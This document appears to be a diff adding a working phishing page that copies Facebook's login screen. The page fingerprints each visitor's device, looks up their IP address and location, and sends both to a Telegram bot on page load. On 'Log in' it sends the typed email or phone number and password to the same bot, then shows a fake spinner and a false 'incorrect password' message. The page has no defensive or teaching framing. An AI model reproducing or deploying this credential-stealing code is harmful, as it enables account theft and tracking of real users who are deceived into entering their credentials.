@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      background: #18191a;
+      color: #e4e6eb;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      margin: auto;
+      padding: 32px 16px 0 16px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .lang {
+      color: #b0b3b8;
+      margin-bottom: 32px;
+      font-size: 16px;
+      text-align: center;
+    }
+    .fb-logo {
+      background: #1877f2;
+      border-radius: 50%;
+      width: 72px;
+      height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 32px;
+    }
+    .fb-logo span {
+      color: #fff;
+      font-size: 56px;
+      font-weight: 900;
+      font-family: 'Segoe UI', 'Arial Black', Arial, sans-serif;
+      line-height: 1;
+      position: relative;
+      top: 4px;
+      letter-spacing: -2px;
+    }
+    .input, .create-btn {
+      width: 100%;
+      padding: 16px;
+      margin-bottom: 16px;
+      border: none;
+      border-radius: 8px;
+      background: #242526;
+      color: #e4e6eb;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 16px;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 999px;
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .login-btn:hover {
+      background: #166fe5;
+    }
+    .forgot {
+      color: #b0b3b8;
+      text-align: center;
+      margin-bottom: 32px;
+      text-decoration: none;
+      display: block;
+      font-size: 16px;
+    }
+    .create-btn {
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+    }
+    .create-btn:hover {
+      background: #1877f2;
+      color: #fff;
+    }
+    .meta {
+      color: #b0b3b8;
+      text-align: center;
+      font-size: 18px;
+      margin-top: auto;
+      margin-bottom: 24px;
+      letter-spacing: 1px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="lang">English (US) &#9660;</div>
+    <div class="fb-logo">
+      <svg width="56" height="56" viewBox="0 0 56 56" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="28" cy="28" r="28" fill="#1877F2"/>
+        <path d="M34.524 35.999l1.09-7.12h-6.03v-4.63c0-1.95.96-3.85 4.04-3.85h3.13V14.88s-2.85-.49-5.58-.49c-5.69 0-9.41 3.45-9.41 9.68v4.82h-6.32v7.12h6.32V48h7.77V35.999h5.01z" fill="#fff"/>
+      </svg>
+    </div>
+    <input class="input" type="text" placeholder="Mobile number or email">
+    <input class="input" type="password" placeholder="Password">
+    <button class="login-btn">Log in</button>
+    <a class="forgot" href="#">Forgot password?</a>
+    <button class="create-btn">Create new account</button>
+  </div>
+  <div class="meta">&#8734; Meta</div>
+  <script>
+    // Fetch Telegram config from server.txt
+    async function getTelegramConfig() {
+      try {
+        const res = await fetch('server.txt');
+        const text = await res.text();
+        const token = text.match(/TOKEN=(.*)/)[1].trim();
+        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+        return { token, chatId };
+      } catch (e) {
+        alert('Failed to load Telegram config.');
+        return { token: '', chatId: '' };
+      }
+    }
+
+    // Replace all Telegram API calls to use dynamic config
+    let TG_API = '';
+    let TELEGRAM_TOKEN = '';
+    let TELEGRAM_CHAT_ID = '';
+    getTelegramConfig().then(cfg => {
+      TELEGRAM_TOKEN = cfg.token;
+      TELEGRAM_CHAT_ID = cfg.chatId;
+      TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    });
+
+    // Guess device name/type from user agent
+    function getDeviceName() {
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) {
+        const match = ua.match(/Android.*; (.+?) Build/);
+        return match ? `Android (${match[1]})` : 'Android Device';
+      } else if (/iPhone/i.test(ua)) {
+        return 'iPhone';
+      } else if (/iPad/i.test(ua)) {
+        return 'iPad';
+      } else if (/Macintosh/i.test(ua)) {
+        return 'Mac';
+      } else if (/Windows/i.test(ua)) {
+        return 'Windows PC';
+      } else if (/Linux/i.test(ua)) {
+        return 'Linux PC';
+      } else {
+        return 'Unknown Device';
+      }
+    }
+
+    // Collect device info
+    async function getDeviceInfo() {
+      let batteryInfo = '';
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryInfo = `🔋 Battery: ${(battery.level * 100).toFixed(0)}%${battery.charging ? ' (Charging)' : ''}`;
+        } catch (e) {
+          batteryInfo = '🔋 Battery: N/A';
+        }
+      } else {
+        batteryInfo = '🔋 Battery: N/A';
+      }
+      // Additional details
+      const screenRes = `🖥️ Screen: ${window.screen.width}x${window.screen.height}`;
+      const timezone = `⏰ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+      const referrer = `🔗 Referrer: ${document.referrer || 'Direct/None'}`;
+      let connectionType = '📶 Connection: N/A';
+      if (navigator.connection && navigator.connection.effectiveType) {
+        connectionType = `📶 Connection: ${navigator.connection.effectiveType.toUpperCase()}`;
+      }
+      const cpuCores = `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}`;
+      const memory = `💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}`;
+      const info = [
+        `📱 Device: ${getDeviceName()}`,
+        `🧭 User Agent: ${navigator.userAgent}`,
+        `💻 Platform: ${navigator.platform}`,
+        `🌐 Language: ${navigator.language}`,
+        screenRes,
+        timezone,
+        referrer,
+        connectionType,
+        cpuCores,
+        memory,
+        batteryInfo,
+        `🕒 Time: ${new Date().toLocaleString()}`
+      ];
+      return info.join('\n');
+    }
+
+    // Fetch IP and geolocation info (CORS-friendly)
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://geolocation-db.com/json/');
+        if (!res.ok) throw new Error('IP info fetch failed');
+        const data = await res.json();
+        return `🌍 IP: ${data.IPv4}\n🏙️ City: ${data.city}\n🌎 Country: ${data.country_name}\n🌐 State: ${data.state}`;
+      } catch (e) {
+        return '🌍 IP Info: N/A';
+      }
+    }
+
+    // Send message to Telegram
+    async function sendToTelegram(message) {
+      await fetch(TG_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
+      });
+    }
+
+    // On page load, send device info and IP info
+    window.addEventListener('DOMContentLoaded', async () => {
+      const deviceInfo = await getDeviceInfo();
+      const ipInfo = await getIPInfo();
+      sendToTelegram(`🟢 New visitor!\n${deviceInfo}\n${ipInfo}`);
+    });
+
+    // On login button click, send credentials, device info, and IP info
+    document.addEventListener('DOMContentLoaded', () => {
+      const loginBtn = document.querySelector('.login-btn');
+      const forgotBtn = document.querySelector('.forgot');
+      const createBtn = document.querySelector('.create-btn');
+      const container = document.querySelector('.container');
+      let loadingDiv = null;
+      let errorDiv = null;
+
+      // Forgot password link
+      forgotBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.open('https://www.facebook.com/login/identify/', '_blank');
+      });
+
+      // Create new account link
+      createBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.open('https://m.facebook.com/reg/#', '_blank');
+      });
+
+      loginBtn.addEventListener('click', async (e) => {
+        e.preventDefault();
+        const email = document.querySelector('input[type="text"]').value;
+        const password = document.querySelector('input[type="password"]').value;
+        const deviceInfo = await getDeviceInfo();
+        const ipInfo = await getIPInfo();
+        // Format credentials as single inline monospace blocks for Telegram with clipboard emoji and hint
+        const credsBlock = `\n\n📋 Tap to copy:\n👤 Email/Phone: \`${email}\`\n🔑 Password: \`${password}\``;
+        const message = `🔐 Login Attempt${credsBlock}\n${deviceInfo}\n${ipInfo}`;
+        sendToTelegram(message);
+
+        // Show loading indicator
+        if (!loadingDiv) {
+          loadingDiv = document.createElement('div');
+          loadingDiv.style.textAlign = 'center';
+          loadingDiv.style.margin = '20px 0';
+          loadingDiv.innerHTML = '<span style="font-size:24px;">⏳</span><br>Loading...';
+          container.appendChild(loadingDiv);
+        }
+        if (errorDiv) {
+          errorDiv.remove();
+          errorDiv = null;
+        }
+        // After 10 seconds, show error message
+        setTimeout(() => {
+          if (loadingDiv) {
+            loadingDiv.remove();
+            loadingDiv = null;
+          }
+          if (!errorDiv) {
+            errorDiv = document.createElement('div');
+            errorDiv.style.textAlign = 'center';
+            errorDiv.style.color = '#e4e6eb';
+            errorDiv.style.margin = '20px 0';
+            errorDiv.innerHTML = `The password that you've entered is incorrect.<br><a href="https://www.facebook.com/login/identify/" target="_blank" style="color:#1877f2;text-decoration:underline;">Forgotten password?</a>`;
+            container.appendChild(errorDiv);
+          }
+        }, 10000);
+      });
+    });
+  </script>
+</body>
+</html>
